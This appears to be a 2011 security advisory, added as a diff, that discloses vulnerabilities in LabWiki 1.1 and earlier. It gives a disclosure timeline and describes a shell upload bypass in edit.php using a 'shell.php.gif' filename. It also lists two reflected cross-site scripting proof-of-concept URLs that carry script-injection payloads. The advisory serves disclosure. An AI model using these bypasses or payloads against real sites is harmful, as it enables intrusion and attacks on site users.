@@ -1,0 +1,36 @@
+------------------------------------------------------------------------
+LabWiki <= 1.1 Multiple Vulnerabilities
+------------------------------------------------------------------------
+     
+author............: muuratsalo (Revshell.com)
+contact...........: muuratsalo[at]gmail[dot]com
+download..........: http://www.bioinformatics.org/phplabware/labwiki/index.php
+    
+     
+[0x01] Vulnerability overview:
+
+All versions of LabWiki <= 1.1 are affected by multiple vulnerabilities.
+
+     
+[0x02] Disclosure timeline:
+     
+[08/11/2011] - Multiple vulnerabilities discovered and reported to the vendor.
+[08/11/2011] - The vendor confirmed the vulnerabilities and he is working on fixing the reported issues.
+[09/11/2011] - Public Disclosure
+
+
+[0x03] Vulnerabilities:
+
+-- Shell Upload Vulnerability --
+The upload script /edit.php improperly checks the filetype of uploaded images.
+A 'shell.php.gif' is accepted.  /* -- note that access to edit.php could be restricted -- */
+
+-- Multiple Cross Site Scripting Vulnerabilities --
+http://localhost/LabWiki/index.php?from="></><script>alert('muuratsalo')</script>&help=true&page=What_is_wiki
+http://localhost/LabWiki/recentchanges.php?nothing=nothing&page_no="></><script>alert('muuratsalo')</script>
+
+
+
+
+
+
